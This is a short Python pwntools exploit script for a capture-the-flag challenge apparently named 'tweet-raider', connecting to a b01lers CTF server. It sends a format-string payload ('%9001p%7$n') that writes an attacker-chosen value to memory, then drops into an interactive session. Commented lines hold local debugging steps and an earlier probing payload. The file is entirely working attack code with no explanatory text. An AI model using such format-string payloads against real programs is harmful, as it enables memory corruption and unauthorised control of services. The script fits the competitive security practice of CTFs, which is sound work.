from pwn import *

#p = process("./tweet-raider")
p = remote("pwn.ctf.b01lers.com",1004)
#p = process("./main")

#print p.pid
#raw_input()

#context.terminal = ["terminator", "-e"]
#gdb.attach(p.pid)

#p.send("a")

print p.readline()	
print p.readline()	
#print p.readline()	

#fs = "AAAAAAAABBBBBBBB "+"%p."*6 + "%n"
fs = "%9001p"+ "%7$n"

p.sendline(fs)

p.interactive()
